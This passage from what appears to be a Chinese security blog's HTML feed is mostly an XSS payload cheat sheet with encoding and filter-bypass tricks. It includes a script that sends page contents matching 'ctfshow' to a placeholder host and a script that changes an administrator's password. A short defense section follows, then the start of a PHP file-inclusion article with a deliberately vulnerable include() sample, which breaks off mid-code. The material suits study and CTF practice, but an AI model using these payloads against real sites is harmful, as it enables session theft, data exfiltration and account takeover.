class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="lt-textarea-gt"><a href="#lt-textarea-gt" class="headerlink" title="&lt;textarea&gt;"></a><code>&lt;textarea&gt;</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">onfocus</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;); <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="lt-keygen-gt"><a href="#lt-keygen-gt" class="headerlink" title="&lt;keygen&gt;"></a><code>&lt;keygen&gt;</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">keygen</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span> //仅限火狐</span><br></pre></td></tr></table></figure><h3 id="lt-marquee-gt"><a href="#lt-marquee-gt" class="headerlink" title="&lt;marquee&gt;"></a><code>&lt;marquee&gt;</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span> //Chrome不行，火狐和IE都可以</span><br></pre></td></tr></table></figure><h3 id="lt-isindex-gt"><a href="#lt-isindex-gt" class="headerlink" title="&lt;isindex&gt;"></a><code>&lt;isindex&gt;</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>//仅限于IE</span><br></pre></td></tr></table></figure><h3 id="利用link远程包含js文件"><a href="#利用link远程包含js文件" class="headerlink" title="利用link远程包含js文件"></a>利用link远程包含js文件</h3><p><strong>PS：在无CSP的情况下才可以</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">import</span> <span class="attr">href</span>=<span class="string">&quot;http://127.0.0.1/1.js&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h3><p><code>&lt;a&gt;</code>标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(`xss`);&quot;</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;iframe&gt;</code>标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;img&gt;</code>标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>//IE7以下</span><br></pre></td></tr></table></figure><p><code>&lt;form&gt;</code>标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;Javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>expression属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;xss:expression(alert(&#x27;xss&#x27;&#x27;))&quot;</span>&gt;</span> // IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:rgb(&#x27;&#x27;�x:expression(alert(1))&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> //IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-id">#test</span>&#123;x:<span class="built_in">expression</span>(<span class="built_in">alert</span>(/XSS/))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span> // IE7以下</span><br></pre></td></tr></table></figure><p>background属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">background</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span> //在Opera 10.5和IE6上有效</span><br></pre></td></tr></table></figure><h2 id="有过滤"><a href="#有过滤" class="headerlink" title="有过滤"></a>有过滤</h2><h3 id="过滤内容测试"><a href="#过滤内容测试" class="headerlink" title="过滤内容测试"></a>过滤内容测试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;&#x27;&quot;scriptonsrcdatahrefiframe</span><br></pre></td></tr></table></figure><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>用<code>/</code>代替空格 或者<code>/**/</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">sRc</span>=<span class="string">x</span> <span class="attr">onerRor</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure><h4 id="双写关键字"><a href="#双写关键字" class="headerlink" title="双写关键字"></a>双写关键字</h4><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">imimgg</span> <span class="attr">srsrcc</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure><h4 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h4><p>利用eval</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用top</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">`xss`</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="其它字符混淆"><a href="#其它字符混淆" class="headerlink" title="其它字符混淆"></a>其它字符混淆</h4><p>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>下面举几个简单的例子</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可利用注释、标签的优先级等</span><br><span class="line">1.&lt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;xss&quot;</span>);<span class="comment">//&lt;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">2.<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=&lt;/<span class="attr">title</span>&gt;</span>&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(`xss`);&quot;</span>&gt;</span> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效</span><br><span class="line">3.<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript"><span class="keyword">var</span> a=<span class="string">&quot;\\&quot;</span>;alert(<span class="string">&quot;xss&quot;</span>);<span class="comment">//&quot;;</span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&quot;</span><span class="attr">xss</span>&quot;);&quot;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#59;</span>&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;</code></p></blockquote><p>Ascii码绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>hex绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220913155828349.png" alt="image-20220913155828349"></p><p>八进制</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;\<span class="attr">170</span>\<span class="attr">163</span>\<span class="attr">163</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><p>base64绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="过滤双引号，单引号"><a href="#过滤双引号，单引号" class="headerlink" title="过滤双引号，单引号"></a>过滤双引号，单引号</h3><p>1.如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=alert(<span class="string">`xss`</span>);&gt;</span><br></pre></td></tr></table></figure><p>2.使用编码绕过，如上</p><h3 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h3><p>当括号被过滤的时候可以使用throw来绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h3><h4 id="使用url编码"><a href="#使用url编码" class="headerlink" title="使用url编码"></a>使用url编码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`&gt;</span><br></pre></td></tr></table></figure><h4 id="使用IP"><a href="#使用IP" class="headerlink" title="使用IP"></a>使用IP</h4><p>1.十进制IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;</span><br></pre></td></tr></table></figure><p>2.八进制IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://0177.0.0.01/`&gt;</span><br></pre></td></tr></table></figure><p>3.hex</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;</span><br></pre></td></tr></table></figure><p>4.html标签中用<code>//</code>可以代替<code>http://</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;</span><br></pre></td></tr></table></figure><p>5.使用<code>\\</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议</span><br></pre></td></tr></table></figure><p>6.使用中文逗号代替英文逗号<br>如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.location=`http://www。baidu。com`&quot;&gt;//会自动跳转到百度</span><br></pre></td></tr></table></figure><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p>尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：</p><ul><li>URL的每一个参数</li><li>URL本身</li><li>表单</li><li>搜索框</li></ul><p><strong>常见业务场景</strong></p><ul><li>重灾区：评论区、留言区、个人信息、订单信息等</li><li>针对型：站内信、网页即时通讯、私信、意见反馈</li><li>存在风险：搜索框、当前目录、图片属性等<h2 id="白盒测试-代码审计"><a href="#白盒测试-代码审计" class="headerlink" title="白盒测试(代码审计)"></a>白盒测试(代码审计)</h2>关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。<br>关注PHP中常见的<strong>接收参数</strong>的方式有<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>等等，可以搜索所有接收参数的地方。然后对接收到的数据进行跟踪，查看是否输出到页面中，然后看输出到页面中的数据是否进行过滤和html编码等处理。<br>关注类似echo这样的<strong>输出语句</strong>，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。<br>大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。<br>同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。</li></ul><h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><p>XSS防御的总体思路是：<strong>对用户的输入(和URL参数)进行过滤，对输出进行html编码</strong>。也就是对用户提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。<br>对输入的内容进行过滤，可以分为黑名单过滤和白名单过滤。黑名单过滤虽然可以拦截大部分的XSS攻击，但是还是存在被绕过的风险。白名单过滤虽然可以基本杜绝XSS攻击，但是真实环境中一般是不能进行如此严格的白名单过滤的。<br>对输出进行html编码，就是通过函数，将用户的输入的数据进行html编码，使其不能作为脚本运行。<br>如下，是使用php中的htmlspecialchars函数对用户输入的name参数进行html编码，将其转换为html实体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. #使用htmlspecialchars函数对用户输入的name参数进行html编码，将其转换为html实体</span><br><span class="line">2. $name = htmlspecialchars( $_GET[ &#x27;name&#x27; ] );</span><br></pre></td></tr></table></figure><p>如下，图一是没有进行html编码的，图2是进行了html编码的。经过html编码后script标签被当成了html实体。<br><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1600134622629-345283db-177f-4fc2-a897-0c0cc96aa67c.png"><br><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1600134622548-eccfacd3-0380-463d-952c-205025d62c4a.png"><br><strong>我们还可以服务端设置会话Cookie的HTTP Only属性</strong>，这样，客户端的JS脚本就不能获取Cookie信息了</p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="遍历页面指定内容"><a href="#遍历页面指定内容" class="headerlink" title="遍历页面指定内容"></a>遍历页面指定内容</h3><p>遍历页面指定内容</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220913182647996.png" alt="image-20220913182647996"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">index,value</span>)</span>&#123;<span class="built_in">console</span>.log(value);&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220913182501975.png" alt="image-20220913182501975"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220913182436491.png" alt="image-20220913182436491"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">index,value</span>)</span>&#123;<span class="built_in">console</span>.log(value.innerHTML);&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">index,value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value.innerHTML.indexOf(<span class="string">&#x27;ctfshow&#x27;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">document</span>.location.href=<span class="string">&#x27;http://xx.xx.xx.xx:8080/x.php?1=&#x27;</span>+value.innerHTML</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">index,value</span>)</span>&#123;<span class="keyword">if</span>(value.innerHTML.indexOf(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#123;&#x27;</span>)&gt;-<span class="number">1</span>)&#123;<span class="built_in">document</span>.location.href=<span class="string">&#x27;http://xx.xx.xx.xx/x.php?1=&#x27;</span>+value.innerHTML&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="修改管理员密码"><a href="#修改管理员密码" class="headerlink" title="修改管理员密码"></a>修改管理员密码</h3><p>get</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220913191604821.png" alt="image-20220913191604821"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location.href=<span class="string">&#x27;http://127.0.0.1/api/change.php?p=1234&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>post</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220913191734406.png" alt="image-20220913191734406"></p><p>查看js</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220913200741056.png" alt="image-20220913200741056"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220913202336875.png" alt="image-20220913202336875"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.ajax(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="string">&#x27;1234&#x27;</span>&#125;&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/p/4089de4e.html"/>
      <url>/p/4089de4e.html</url>
      
        <content type="html"><![CDATA[<h1 id="PHP文件包含漏洞"><a href="#PHP文件包含漏洞" class="headerlink" title="PHP文件包含漏洞"></a>PHP文件包含漏洞</h1><h2 id="php文件包含函数"><a href="#php文件包含函数" class="headerlink" title="php文件包含函数"></a>php文件包含函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()<span class="comment"># 如果出错的话，只会提出警告，会继续执行后续语句</span></span><br><span class="line"><span class="keyword">include_once</span>()</span><br><span class="line"><span class="keyword">require</span>()<span class="comment"># 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句</span></span><br><span class="line"><span class="keyword">require_once</span>()<span class="comment"># _once()一个文件已经被包含过了，则不会再包含它，以避免函数重定义或变量重赋值等问题。</span></span><br></pre></td></tr></table></figure><p>示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LFI本地文件包含"><a href="#LFI本地文件包含" class="headerlink" title="LFI本地文件包含"></a>LFI本地文件包含</h2><h2 id="RFI远程文件包含"><a href="#RFI远程文件包含" class="headerlink" title="RFI远程文件包含"></a>RFI远程文件包含</h2><p>相较于<strong>LFI本地文件包含漏洞</strong>其被包含的文件源不从磁盘上获取</p><p><code>php.ini</code>中需要配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure><p>allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off</p><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><h3 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a><code>php://</code> 协议</h3><h4 id="php-input-用于执行php代码"><a href="#php-input-用于执行php代码" class="headerlink" title="php://input 用于执行php代码"></a>php://input 用于执行php代码</h4><p><code>allow_url_include = On</code><br><code>allow_url_fopen = ON/OFF</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 